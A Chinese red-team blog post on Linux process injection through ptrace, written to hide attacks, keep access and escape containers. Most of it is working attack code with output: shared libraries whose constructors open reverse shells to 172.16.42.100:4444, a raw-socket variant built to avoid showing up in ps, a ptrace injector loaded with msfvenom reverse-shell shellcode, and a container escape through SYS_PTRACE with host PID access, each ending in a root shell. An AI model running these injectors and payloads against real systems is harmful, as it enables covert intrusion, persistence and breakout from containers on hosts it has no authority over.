---
title: linux进程注入
date: 2021-12-29 19:54:03
categories: 红队技术
tags:
- Linux安全
---

> 持而盈之，不如其已。揣而锐之，不可长保。

通过linux进程注入我们可以进行隐藏我们的攻击，维持我们的权限，某些场景下也可以进行容器逃逸。

<!-- more -->

## 1. 使用动态链接库进行进程注入

### 1.1 动态链接注入

通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用`ptrace()`实现了与Windows平台下相同作用的API 函数`CreateRemoteThread()`。

linux的/proc/sys/kernel/yama/ptrace_scope限制了一个进程除了`fork()`派生外，无法通过`ptrace()`来操作另外一个进程。我们可以通过`echo 0 | tee /proc/sys/kernel/yama/ptrace_scope`来修改，但是一般linux版本默认就是为0。

使用别已经造好的进程注入轮子：https://github.com/gaffe23/linux-inject.git



### 1.2 进程注入工具安装

**1. 下载：**

```
git clone https://github.com/gaffe23/linux-inject.git
```

**2. 编译：**

```
cd linux-inject
make x86_64
```

如果报错类似如下：

```bash
/usr/include/stdio.h:27:10: fatal error: 'bits/libc-header-start.h' file not found
```

执行`apt install gcc-multilib`即可。

**3. 测试是否编译成功：**

- 启动sample-target

  ```bash
  ➜  linux-inject git:(master) ./sample-target
  sleeping...
  sleeping...
  sleeping...
  ```

  

- 查看sample-target的进程

  ```bash
  ➜  linux-inject git:(master) ps -ef | grep sample-target | grep -v grep
  root      15771  15710  0 20:12 pts/3    00:00:00 ./sample-targe
  ```

  进程为15771

- 尝试注入进程

  ```bash
  ➜  linux-inject git:(master) ./inject -p 15771 ./sample-library.so
  targeting process with pid 15771
  could not inject "./sample-library.so"
  ```

  

- 进程注入成功

  ```bash
  ➜  linux-inject git:(master) ./sample-target
  sleeping...
  sleeping...
  sleeping...
  sleeping...
  sleeping...
  ......
  I just got loaded
  ```

  注入成功会有”I just got loaded“的提示



### 1.3 编写一个简单的poc

我们重写so文件，进行反弹shell。

poc1.c:

```c
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>


void shell()
{
	printf("I just got loaded\n");
    system("bash -c \"bash -i >& /dev/tcp/172.16.42.100/4444 0>&1\"");
   
}


__attribute__((constructor))
void loadMsg()
{
   shell();
}
```



我们用clang进行编译，编译前先安装`apt install clang`

```bash
clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc1.so -lpthread -fPIC poc1.c
```

我们启动一个python进程用来注入

```
python3 -m http.server 9999
```

在攻击机上启动监听：

```
nc -lvvp 4444
```

注入：

```bash
➜ ps -ef | grep 9999 | grep -v grep
root      16603  15710  0 20:38 pts/3    00:00:00 python3 -m http.server 9999
➜ ./linux-inject/inject -p 16603 ./poc1.so
targeting process with pid 16603
ptrace(PTRACE_GETSIGINFO) failed
```

结果：

```bash
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.151.
Ncat: Connection from 172.16.42.151:37444.
root@vuln:~/poc/linux-inject#
```



### 1.4 测试开启ptrace_scope

我用的debian,linux内核 4.19，测试是成功的

```bash
➜ echo 1 | tee /proc/sys/kernel/yama/ptrace_scope
1

➜ cat /proc/sys/kernel/yama/ptrace_scope
1

➜ ps -ef | grep 6666 | grep -v grep
root        854    649  1 10:32 pts/1    00:00:00 python3 -m http.server 6666

➜ ./linux-inject/inject -p 854 ./poc1.so
targeting process with pid 854
ptrace(PTRACE_GETSIGINFO) failed

➜ uname -a
Linux vuln 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
```



### 1.5 使用多线程编写poc

修改poc为多线程版本，将后门代码与正常逻辑分离执行，这样就不会影响正常的线程

```c
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>

void shell()
{
   printf("I just got loaded\n");
   system("bash -c \"bash -i >& /dev/tcp/172.16.42.100/4444 0>&1\"");
}


__attribute__((constructor))
void loadMsg()
{
   pthread_t thread_id;
   pthread_create(&thread_id,NULL,shell,NULL);
}
```

**编译：**

```bash
➜ clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc2.so -lpthread -fPIC poc2.c
poc2.c:17:4: warning: implicit declaration of function 'pthread_create' is invalid in C99 [-Wimplicit-function-declaration]
```

**启动一个被注入的python进程：**

```bash
 python3 -m http.server 1111
```

**攻击机监听：**

```bash
nc -lvvp 4444
```



**进程注入：**

```bash
➜ ps -ef | grep 1111 | grep -v grep
root       1333   1299  0 11:53 pts/1    00:00:00 python3 -m http.server 1111
➜ ./linux-inject/inject -p 1333 ./poc2.so
targeting process with pid 1333
could not inject "./poc2.so
```

**收到了shell：**

```bash
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.151.
Ncat: Connection from 172.16.42.151:39404.
root@vuln:~#
```



### 1.6 使用socket套接字编写poc

这种方式的好处是可以隐藏我们的行为，上述方式都可以通过查看进程的方式发现恶意注入的代码

```bash
➜ ps -ef | grep bash
root       1447   1406  0 12:00 pts/1    00:00:00 sh -c bash -c "bash -i >& /dev/tcp/172.16.42.100/4444 0>&1"
root       1448   1447  0 12:00 pts/1    00:00:00 bash -c bash -i >& /dev/tcp/172.16.42.100/4444 0>&1
root       1449   1448  0 12:00 pts/1    00:00:00 bash -i
root       1487    978  0 12:00 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash
```

我们可以发现我们已经暴露了我们反弹的shell地址。

解决方式就是自己写一个socket连接，而不是调用system函数

poc.c

```c
#include <stdio.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>


static void * hello()
{

    struct sockaddr_in server;
    int sock;
    char shell[]="/bin/bash";
    if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        return NULL;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    server.sin_addr.s_addr = inet_addr("172.16.42.100");
    if(connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
        return NULL;
    }
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl(shell,"/bin/bash",(char *)0);
    close(sock);
  printf("I just got loaded\n");
    return NULL;
}

__attribute__((constructor))
void loadMsg()
{
    pthread_t thread_id;
    pthread_create(&thread_id,NULL,hello,NULL);
}
```

**编译：**

```bash
clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc.so -lpthread -fPIC poc.c
```

**启一个python进程作为注入目标：**

```bash
python3 -m http.server 123
```

**攻击机启动监听：**

```bash
nc -lvvp 4444
```

**注入进程：**

```bash
➜  ps -ef | grep 123 | grep -v grep
root       1694   1299  0 12:08 pts/1    00:00:00 python3 -m http.server 123
➜  ./linux-inject/inject -p 1694 ./poc.so
targeting process with pid 1694
ptrace(PTRACE_GETSIGINFO) failed
```

**结果：**

```bash
root@vuln:~# exit
NCAT DEBUG: Closing fd 5.
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.151.
Ncat: Connection from 172.16.42.151:39410.
id
uid=0(root) gid=0(root) 组=0(root)
```

**再次查看进程：**

```bash
➜  ps -ef | grep bash
root       1694   1299  0 12:08 pts/1    00:00:00 /bin/bash
root       1785    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox bash
➜  ps -ef | grep python
root        435      1  0 11:27 ?        00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       1547   1299  0 12:04 pts/1    00:00:00 python3 -m http.server 3333
root       1800    978  0 12:10 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox python
```

**通过网络连接查看：**

通过网络连接可以发现

```bash
➜  netstat -pantu
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
......
tcp        0      0 172.16.42.151:39410     172.16.42.100:4444      ESTABLISHED 1694/bas
......
```



## 2. 通过shellcode注入进程

攻击机器：172.16.42.100

靶机：172.16.42.151

获取poc：https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c

生成shellcode(如果不生成，会在靶机上生成一个终端):

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.42.100 LPORT=4444 -f c
```

替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:

```c
/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 74

unsigned char *shellcode = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"; 


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}


```

编译代码:

```
gcc infect.c -o infectx
```

攻击机监听

```
nc -lvvp 4444
```

靶机宿主机启动一个python server进程

```
python3 -m http.server 124
```

注入

 ```bash
➜  ps -ef | grep 124 | grep -v grep
root       2239   2216  0 09:43 pts/1    00:00:00 python3 -m http.server 124
➜  ./infectx 2239
+ Tracing process 2239
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f222adc87e4
+ Setting instruction pointer to 0x7f222adc87e6
+ Run it!
 ```

 结果：

```bash
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.151.
Ncat: Connection from 172.16.42.151:39412.
id
uid=0(root) gid=0(root) groups=0(root)
```





## 3. 利用shellcode进程注入进行容器逃逸

攻击机器：172.16.42.100

靶机：172.16.42.151

带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试

靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器

```
docker run --name test -itd --cap-add=SYS_PTRACE --pid=host --security-opt apparmor=unconfined --rm ubuntu
```

**利用成功前提：**

```
--cap-add=SYS_PTRACE
--pid=host
--security-opt apparmor=unconfined
```



获取poc：https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c

生成shellcode(如果不生成，会在靶机上生成一个终端):

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.42.100 LPORT=4444 -f c
```

替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:

```c
/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 74

unsigned char *shellcode = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"; 


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}


```

编译代码:

```
gcc infect.c -o infect
```

移动到容器：

```
docker cp infect test:/root/
```

攻击机监听

```
nc -lvvp 4444
```

靶机宿主机启动一个python server进程

```
python -m SimpleHTTPServer 55555
```

查看python server进程:7365

 ```bash
➜  poc docker cp infect test:/root/
➜  poc docker exec -it test /bin/bash
root@f147ae171646:/# ps -ef | grep 5555
root      15260   7462  0 11:44 ?        00:00:00 python3 -m http.server 55555
root      15262  15233  0 11:45 pts/1    00:00:00 grep --color=auto 5555
root@f147ae171646:/# /root/infect 15260
+ Tracing process 15260
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7fdb32ef77e4
+ Setting instruction pointer to 0x7fdb32ef77e6
+ Run it!
root@f147ae171646:/#
 ```

 结果：

```bash
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.151.
Ncat: Connection from 172.16.42.151:37440.
ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255
        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)
        RX packets 206535  bytes 221632693 (211.3 MiB)

```



测试动态链接库进行容器逃逸没有成功。可能是不能将容器里的so文件注入到宿主机的进程靶。



## 4. 总结

本文先使用动态链接库进行了进程注入，这种方式比较隐蔽，然后使用shellcode注入进程，两者的原理都是通过ptrace来实现的。shellcode的代码是单线程的所以会导致进程阻塞，也许可以加以改造，本人c代码能力有限，暂时不尝试。后续也许会添加用go实现的版本。









## 参考

- https://payloads.online/archivers/2020-01-01/2/
- https://www.52coder.net/post/ld-preload
- https://payloads.online/archivers/2020-01-01/1/

